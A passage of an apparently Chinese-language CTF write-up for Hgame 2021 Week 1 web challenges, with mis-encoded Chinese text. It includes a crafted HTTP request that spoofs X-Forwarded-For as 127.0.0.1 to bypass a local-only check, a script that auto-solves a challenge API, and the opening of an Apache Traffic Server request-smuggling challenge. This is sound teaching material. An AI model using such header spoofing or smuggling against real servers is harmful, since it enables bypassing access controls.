href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><blockquote><p>ç¬¬ä¸€æ¬¡åœ¨é“¶æ²³ç³»é‡Œæ­é¡ºé£è½¦ï¼Œè¦å‡†å¤‡å•¥ï¼Œåœ¨çº¿ç­‰ï¼ŒæŒºæ€¥çš„</p><p><a href="http://5f517db502.hitchhiker42.0727.site:42420/">http://5f517db502.hitchhiker42.0727.site:42420</a> </p></blockquote><p>è®¿é—®æç¤º</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210131015723955.png"></p><p>æ­ä¸ªé¡ºé£è½¦ï¼Œè®¿é—® <code>/HitchhikerGuide.php</code>ï¼Œå‘ç°302åˆ°ä¸»é¡µ <code>index.php</code> äº†ã€‚</p><p>æ”¹æˆ POSTã€‚</p><p>ç„¶åä¸€ç³»åˆ—çš„å¥—è·¯å•¦ã€‚</p><blockquote><p>â€‹    åªæœ‰ä½¿ç”¨â€æ— é™éæ¦‚ç‡å¼•æ“â€(Infinite Improbability Drive)æ‰èƒ½è®¿é—®è¿™é‡Œï½</p></blockquote><blockquote><p>â€‹    ä½ çŸ¥é“å—ï¼Ÿ<a href="https://github.com/wuhan005">èŒ„å­</a>ç‰¹åˆ«è¦æ±‚ï¼šä½ å¾—ä»ä»–çš„<a href="https://cardinal.ink/">Cardinal</a>è¿‡æ¥</p></blockquote><blockquote><p>â€‹    flagä»…èƒ½é€šè¿‡æœ¬åœ°è®¿é—®è·å¾—</p></blockquote><p>æœ€åçš„ payload å¦‚ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">POST /HitchhikerGuide.php HTTP/1.1Host: 5f517db502.hitchhiker42.0727.site:42420User-Agent: Infinite Improbability DriveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://cardinal.ink/Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheOrigin: http://5f517db502.hitchhiker42.0727.site:42420Content-Length: 0X-Forwarded-For: 127.0.0.1</code></pre><p><code>hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}</code></p><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p><a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>å™¢ï¼Œåˆæˆå¤§è¥¿ç“œå•Šï¼Œå…¶å®å…ˆæ˜¯ç©äº†æŒºä¹…ç”šè‡³æœ‰ç‚¹ä¸Šç˜¾<em>ï¼ˆå¤§é›¾</em></p><p>çœ‹åˆ°å¤±è´¥äº†ä¼šæç¤º â€œè¾¾åˆ°ä¸¤åƒåˆ†å°±å¯ä»¥å¾—åˆ°flagâ€ã€‚</p><p>ä¸‹é¢å¼€å§‹è§£é¢˜ï¼Œçœ‹äº†çœ‹ networkï¼Œå·¨å¤šæ–‡ä»¶ï¼Œä¸è¿‡æœ‰ç”¨çš„å¹¶ä¸å¤šï¼Œå¤§éƒ¨åˆ†æ˜¯å›¾ç‰‡éŸ³é¢‘ä»€ä¹ˆçš„ã€‚</p><p>å…ˆå…¨å±€æœäº†ä¸€ä¸‹ï¼Œæ²¡æ‰¾åˆ° <code>flag</code>ï¼Œ<code>hgame</code> ä¹Ÿæ²¡æœ‰ã€‚</p><p>å…³é”®çš„éƒ¨åˆ†åŒ…æ‹¬ <code>index.html</code>ã€é…ç½® <code>settings.js</code>ã€ <code>project.js</code>ã€<del>è¿˜æœ‰å¹¿å‘Š <code>ads.js</code></del><em>ï¼ˆä»–æ³¨é‡Šæ‰äº†</em></p><p>éšæ„çœ‹äº†ä¸€ä¸‹å‘ç°æ‰“åŒ…çš„æœ‰ç‚¹å¥½ï¼Œæ‰‹è§£ä¸æ–¹ä¾¿ï¼Œconsole è°ƒè¯•ä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚</p><p>å¿ƒæƒ³ç€å‡ºé¢˜äººåº”è¯¥æ˜¯ç›´æ¥é­”æ”¹çš„æºç ï¼Œç„¶åå»æ‰¾æºç äº†ã€‚</p><p>åœ¨ GitHub ä¸Šæ‰¾åˆ°äº† åŸç‰ˆå’Œé­”æ”¹ç‰ˆçš„æºç  repo <a href="https://github.com/xiaopengand/daxigua">https://github.com/xiaopengand/daxigua</a></p><p>å†æ¯”å¯¹ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†å¯ä»¥çš„éƒ¨åˆ†äº†ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201170510561.png" alt="ä¿®æ”¹çš„æºç "></p><p>å…¶å®å…¨å±€æœ <code>gameover</code> ä¹Ÿèƒ½æ‰¾åˆ°ï¼Œ233.</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201170748014.png" alt="flag"></p><p><code>hgame{do_you_know_cocos_game?}</code></p><p>å…¶å®ç›´æ¥ base64 è§£å¯†ä¸€ä¸‹ä¹Ÿè¡Œã€‚</p><p>ï¼ˆå™¢ï¼Œcocos æ¸¸æˆå¼•æ“å•Š</p><h3 id="æ™ºå•†æ£€æµ‹é¸¡"><a href="#æ™ºå•†æ£€æµ‹é¸¡" class="headerlink" title="æ™ºå•†æ£€æµ‹é¸¡"></a>æ™ºå•†æ£€æµ‹é¸¡</h3><blockquote><p>åˆæœ‰è°ä¸çˆ±é«˜æ•°å‘¢ï¼Ÿåæ­£æˆ‘ä¸çˆ±ï¼ˆè¯·ä½¿ç”¨firefoxæµè§ˆå™¨æ‰“å¼€é¢˜ç›®ï¼‰</p><p><a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p></blockquote><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201181304937.png" alt="é¢˜ç›®"></p><p>åˆæ˜¯ ç§¯åˆ†é«˜æ•°é¢˜å•Šï¼Œæƒ³èµ·äº† <a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/#%E8%B6%85%E5%9F%BA%E7%A1%80%E7%9A%84%E6%95%B0%E7%90%86%E6%A8%A1%E6%8B%9F%E5%99%A8">USTC Hackergame é‚£é“ è¶…åŸºç¡€çš„æ•°ç†æ¨¡æ‹Ÿå™¨</a>â€¦â€¦</p><p>ä¸è¿‡è¿™ä¸ªç®€å•ï¼Œç§¯åˆ†å¼å…¨éƒ¨ä¸ºax+bçš„å½¢å¼ï¼Œç›´æ¥åŒ¹é…ç›´æ¥ç®—å°±å¥½äº†ï¼Œéƒ½ä¸éœ€è¦å’Œ Mathematica è”åŠ¨ã€‚</p><p>ç›¸å…³çš„ API åœ¨ <a href="http://r4u.top:5000/static/js/fuckmath.js">http://r4u.top:5000/static/js/fuckmath.js</a></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        xhrFields<span class="token operator">:</span> <span class="token punctuation">{</span>            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    xhrFields<span class="token operator">:</span> <span class="token punctuation">{</span>        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success"&gt;\n                    &lt;strong&gt;Right!&lt;/strong&gt;\n                &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger"&gt;\n                    &lt;strong&gt;Wrong!&lt;/strong&gt;\n                &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿”å›çš„å…¬å¼æ ¼å¼ä¸º</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mrow</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>msubsup</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>\u222b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mrow</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>92<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mrow</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mrow</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>31<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mrow</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>msubsup</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>d<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtd</span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mrow</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">&gt;</span></span></code></pre><p>ç„¶åå†™è„šæœ¬å°±å¥½äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""Hgame Week1 Web æ™ºå•†æ£€æµ‹é¸¡http://r4u.top:5000/@Author: MiaoTony@Time: 20210201"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSouphost <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"</span><span class="token punctuation">}</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>headers <span class="token operator">=</span> headers<span class="token keyword">def</span> <span class="token function">getInfo</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/getStatus"</span>    r <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    solving <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"solving"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---"</span><span class="token punctuation">,</span> solving<span class="token punctuation">,</span> <span class="token string">"---"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> solving<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span>    r <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"====&gt;"</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span>    r <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    question <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"question"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"====&gt;"</span><span class="token punctuation">,</span> question<span class="token punctuation">)</span>    <span class="token keyword">return</span> question<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/verify"</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> answer<span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;===="</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>    sub<span class="token punctuation">,</span> sup <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'msubsup &gt; mrow'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'math &gt; mrow'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text    x <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'\((-?\d+)x\+(\d+)\)'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>    <span class="token comment"># a/2 x**2 + b x</span>    answer <span class="token operator">=</span> a<span class="token operator">/</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>sup<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>sub<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token operator">*</span><span class="token punctuation">(</span>sup<span class="token operator">-</span>sub<span class="token punctuation">)</span>    answer <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>answer<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>    submit<span class="token punctuation">(</span>answer<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    status <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> status <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">:</span>        q <span class="token operator">=</span> getQuestion<span class="token punctuation">(</span><span class="token punctuation">)</span>        solve<span class="token punctuation">(</span>q<span class="token punctuation">)</span>        status <span class="token operator">=</span> getStatus<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>        getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ç„¶åå°±æ˜¯æ„‰å¿«çš„è§£é¢˜ç¯èŠ‚ï¼Œæœ€åæ‹¿åˆ° flagã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201182107072.png" alt="flag"></p><p><code>hgame{3very0ne_H4tes_Math}</code></p><h3 id="å®è—èµ°ç§è€…"><a href="#å®è—èµ°ç§è€…" class="headerlink" title="å®è—èµ°ç§è€…"></a>å®è—èµ°ç§è€…</h3><blockquote><p> <strong>hint: æ³¨æ„ç•™æ„æœåŠ¡å™¨ä¿¡æ¯</strong><br> <strong>èµ„æ–™ï¼š<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br> å®è—èµ°ç§è€… Switch å–œæ¬¢å·ç›—å¹¶å°†å¥‡ç‰¹çš„å®è—èµ°ç§åˆ°ä¸€äº›é»‘å¸‚å•†å®¶æ‰‹ä¸­ã€‚<br> ä¸ºäº†é˜»æ­¢å…¶ç»§ç»­ä½œæ¶ï¼Œè­¦æ¢ Liki å¥‰å‘½å°† Switch æŠ“æ•å½’æ¡ˆã€‚<br> è°ƒæŸ¥è¿‡ç¨‹ä¸­ï¼ŒLiki å‘ç° Switch å°†ä¸€ä¸ªç§˜å¯†è—åœ¨äº†ä¸€ä¸ªç§äººæœåŠ¡å™¨ä¸­ã€‚<br> è¿™æˆ–è®¸ä¼šæˆä¸ºåç»­è¿½æŸ¥ Switch çš„é‡å¤§çº¿ç´¢ï¼Œä½ èƒ½æ‰¾åˆ°è¿™ä¸ªç§˜å¯†å—ï¼Ÿ</p><p>Challenge Address: <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p></blockquote><p><strong>HTTP èµ°ç§</strong>ï¼Œç¬¬ä¸€æ¬¡å¬è¯´è¿™ä¸ªæ¦‚å¿µå–µã€‚</p><p>Apache Traffic Server</p><p>çœ‹ä¸€ä¸‹æœåŠ¡å™¨ï¼ŒATS/7.1.2ï¼Œåœ¨æ¼æ´çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œè¿˜æ­£å¥½å’Œæ–‡ä¸­çš„ä¸€æ ·ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202170856763.png" alt="ATS7.1.2"></p><p>ç›´æ¥è®¿é—® <code>/secret</code> ä¼šæç¤º <code>Client-IP NOT FOUND IN HEADERS!</code>ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202214549490.png"></p><p>ä¼°è®¡å°±æ˜¯ ATS ä¼ åˆ°åé¢çš„ Nginx çš„æ—¶å€™ï¼Œæ²¡æœ‰å¸¦ä¸Š <code>Client-IP</code>ï¼Œä½†æ˜¯å¦‚æœæ‰‹åŠ¨ç»™å®š <code>Client-IP</code> åˆ™ä¼šè¿”å›çœŸå®çš„ IP è€Œä¸æ˜¯è‡ªå·±è®¾ç½®çš„ã€‚</p><p>å‚è€ƒ <a href="https://paper.seebug.org/1048/#433%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%AC%AC%E4%B8%89%E4%B8%AA%E8%A1%A5%E4%B8%81%E3%80%82">https://paper.seebug.org/1048/#433ï¼Œè¿™ä¸ªç¬¬ä¸‰ä¸ªè¡¥ä¸ã€‚</a></p><blockquote><p><a href="https://github.com/apache/trafficserver/pull/3231">https://github.com/apache/trafficserver/pull/3231</a> # 3231 